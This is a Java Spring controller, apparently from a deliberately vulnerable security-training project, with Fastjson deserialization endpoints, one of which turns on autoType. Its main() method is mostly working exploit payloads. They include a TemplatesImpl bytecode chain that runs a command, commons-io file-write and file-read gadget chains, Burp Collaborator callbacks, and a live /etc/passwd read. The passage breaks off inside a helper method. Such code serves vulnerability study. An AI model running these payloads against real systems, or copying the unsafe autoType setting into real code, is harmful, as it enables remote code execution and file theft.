package org.joychou.controller;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.parser.ParserConfig;
import org.joychou.dao.User;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;

import java.lang.reflect.Type;
import java.net.MalformedURLException;
import java.util.Map;


@Controller
@RequestMapping("/fastjson")
public class Fastjson {

    @RequestMapping(value = "/deserialize", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            JSONObject ob = JSON.parseObject(params);
            return ob.toString();
//            return ob.get("name").toString();
        } catch (Exception e) {
            throw  e;
        }
    }

    @RequestMapping(value = "/deserialize0", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize0(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            JSONObject ob = JSON.parseObject(params);
            return ob.toString();
//            return ob.get("name").toString();
        } catch (Exception e) {
            return e.toString();
//            throw  e;
        }
    }


    @RequestMapping(value = "/deserialize00", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize00(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
            JSONObject ob = JSON.parseObject(params);
            return ob.toString();
//            return ob.get("name").toString();
        } catch (Exception e) {
            return e.toString();
//            throw  e;
        }
    }

    @RequestMapping(value = "/deserialize1", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize1(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
//            JSONObject ob = JSON.parseObject(params, Feature.SafeMode);
//            return ob.toString();
//            return ob.get("name").toString();
            return "";
        } catch (Exception e) {
            return e.toString();
//            throw  e;
        }
    }



    @RequestMapping(value = "/deserialize2", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize2(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            User ob = JSON.parseObject(params, User.class);
            return ob.toString();
//            return ob.get("name").toString();
        } catch (Exception e) {
            return e.toString();
//            throw  e;
        }
    }


    @RequestMapping(value = "/deserialize3", method = {RequestMethod.POST})
    @ResponseBody
    public String Deserialize3(@RequestBody String params) {
        // 如果Content-Type不设置application/json格式，post数据会被url编码
        try {
            // 将post提交的string转换为json
            Object ob = JSON.parseObject(params).toJavaObject(org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException.class);
            return ob.toString();
//            return ob.get("name").toString();
        } catch (Exception e) {
            return e.toString();
//            throw  e;
        }
    }

    public static void main(String[] args) throws MalformedURLException {
        // Open calc in mac
//        String payload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADEAOAoAAwAiBwA2BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQAzTG1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQ7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHACcBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAhFeHAuamF2YQwACgALBwAoAQAxbWUvbGlnaHRsZXNzL2Zhc3Rqc29uL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAHW1lL2xpZ2h0bGVzcy9mYXN0anNvbi9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQASb3BlbiAtYSBDYWxjdWxhdG9yCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA9saWdodGxlc3MvcHduZXIBABFMbGlnaHRsZXNzL3B3bmVyOwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAADwADgAAAAwAAQAAAAUADwA3AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAD8ADgAAACAAAwAAAAEADwA3AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAEIADgAAACoABAAAAAEADwA3AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAABsAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAAAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==\"], \"_name\": \"lightless\", \"_tfactory\": { }, \"_outputProperties\":{ }}";
//        JSON.parseObject(payload, Feature.SupportNonPublicField);
//        String result = formatChars("root:".toCharArray());
//        System.out.println(result);

//        String aaa_8192 = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
//        String write_name = "C://repos//burp//plugins//test_1.2.68.txt";
//        String read_name = "C://repos//burp//plugins//authParams.cfg.bak";
//        String payload = "{\"x\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"input\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"\""+aaa_8192+"\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"branch\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writer\":{\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\"file\":\""+write_name+"\",\"encoding\":\"UTF-8\",\"append\": false},\"charsetName\":\"UTF-8\",\"bufferSize\": 1024,\"writeImmediately\": true},\"trigger\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger2\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger3\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"is\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"}}}";
//        String payload_commons_io_filewrite_7_8 = "{\"x\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",\"input\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"org.apache.commons.io.input.CharSequenceReader\",\"charSequence\":{\"@type\":\"java.lang.String\"\""+aaa_8192+"\",\"start\":0,\"end\":2147483647},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"branch\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.output.WriterOutputStream\",\"writer\":{\"@type\":\"org.apache.commons.io.output.FileWriterWithEncoding\",\"file\":\""+write_name+"\",\"charsetName\":\"UTF-8\",\"append\": false},\"charsetName\":\"UTF-8\",\"bufferSize\": 1024,\"writeImmediately\": true},\"trigger\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger2\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"},\"trigger3\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.XmlStreamReader\",\"inputStream\":{\"@type\":\"org.apache.commons.io.input.TeeInputStream\",\"input\":{\"$ref\":\"$.input\"},\"branch\":{\"$ref\":\"$.branch\"},\"closeBranch\": true},\"httpContentType\":\"text/xml\",\"lenient\":false,\"defaultEncoding\":\"UTF-8\"}}";
//        String payload_read_file = "{\"abc\": {\"@type\": \"java.lang.AutoCloseable\",\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\"delegate\": {\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\"reader\": {\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\"url\": \"file:///C://repos//burp//plugins//authParams.cfg.bak\"},\"charsetName\": \"UTF-8\",\"bufferSize\": 1024},\"boms\": [{\"charsetName\": \"UTF-8\",\"bytes\": [11]}]},\"address\": {\"$ref\": \"$.abc.BOM\"}}";
//        JSON.parseObject(payload_read_file);

//        org.apache.http.ConnectionClosedException2 exception = new org.apache.http.ConnectionClosedException2("test", new java.net.URL("https://gbvr2m5h71jwj6a1sdm3r55nue07ow.burpcollaborator.net/fastjson"), new java.net.URL("https://gbvr2m5h71jwj6a1sdm3r55nue07ow.burpcollaborator.net/fastjson"));
//        String params = JSON.toJSONString(exception);
//        System.out.println(params);
//        org.apache.commons.io.DirectoryWalker.CancelException exception = new org.apache.commons.io.DirectoryWalker.CancelException(new java.io.File("/etc/passwd"), 1);
//        String params = JSON.toJSONString(exception);
//        System.out.println(params);


        String param2 = "{\"a\":{\"@type\":\"java.lang.Exception\",\n" +
                "\"@type\":\"org.apache.commons.io.DirectoryWalker$CancelException\",\n" +
                "\"file\":\"/etc/passwd\",\n" +
                "\"depth\":1\n" +
                "},\n" +
                "\"clientId\":{\"$ref\":\"$a.File\"}}";
        JSONObject ob = JSON.parseObject(param2);
        System.out.println(ob.toString());
    }


    public static char fakeChar(char[] fileName){
        char[] fs=new char[fileName.length+1];
        System.arraycopy(fileName,0,fs,0,fileName.length);
        for (char i = 1; i <= 127; i++) {
            fs[fs.length-1]=i;
